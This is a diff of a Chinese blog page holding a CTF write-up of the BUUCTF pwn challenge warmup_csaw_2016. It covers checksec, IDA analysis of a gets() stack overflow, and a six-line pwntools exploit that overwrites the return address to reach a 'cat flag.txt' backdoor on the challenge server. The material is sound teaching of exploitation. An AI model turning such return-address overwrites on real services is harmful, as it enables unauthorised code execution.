@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -155,7 +157,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T3-warmup-csaw-2016"><span class="nav-text">T3 warmup_csaw_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-checksec"><span class="nav-text">0x01 checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IDA"><span class="nav-text">0x02 IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-exp"><span class="nav-text">0x03 exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-thinking"><span class="nav-text">0x04 thinking</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T3 warmup_csaw_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01 checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02 IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03 exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04 thinking</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -181,7 +183,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -373,17 +375,17 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T3-warmup-csaw-2016"><a href="#T3-warmup-csaw-2016" class="headerlink" title="T3 warmup_csaw_2016"></a>T3 warmup_csaw_2016</h2><blockquote>
+        <h2><span id="t3-warmup_csaw_2016">T3 warmup_csaw_2016</span></h2><blockquote>
 <p>2023-01-06WP<br>BUUCTF pwn第三题<br>考点：栈溢出，与上题类似</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了）<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
-<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>f5反汇编，main函数里有一个gets()函数<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>看到返回一个gets()函数，可利用栈溢出<br><del>但是这个两个参数的gets函数没有看懂……</del><br><del>那个write和sprintf函数也没看懂……</del><br>shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度）<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
-<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>写出exploit</p>
+<h3><span id="0x01-checksec">0x01 checksec</span></h3><p>下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了）<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
+<h3><span id="0x02-ida">0x02 IDA</span></h3><p>f5反汇编，main函数里有一个gets()函数<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>看到返回一个gets()函数，可利用栈溢出<br><del>但是这个两个参数的gets函数没有看懂……</del><br><del>那个write和sprintf函数也没看懂……</del><br>shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度）<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
+<h3><span id="0x03-exp">0x03 exp</span></h3><p>写出exploit</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25916)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>得到flag<br><img data-src="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp"></p>
-<h3 id="0x04-thinking"><a href="#0x04-thinking" class="headerlink" title="0x04 thinking"></a>0x04 thinking</h3><p>这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址<br>一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,<br>还是对信息不太敏感……<br>不过对栈的相关知识的学习还是让人感觉有收获的</p>
+<h3><span id="0x04-thinking">0x04 thinking</span></h3><p>这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址<br>一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,<br>还是对信息不太敏感……<br>不过对栈的相关知识的学习还是让人感觉有收获的</p>
 
     </div>
 
@@ -591,13 +593,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
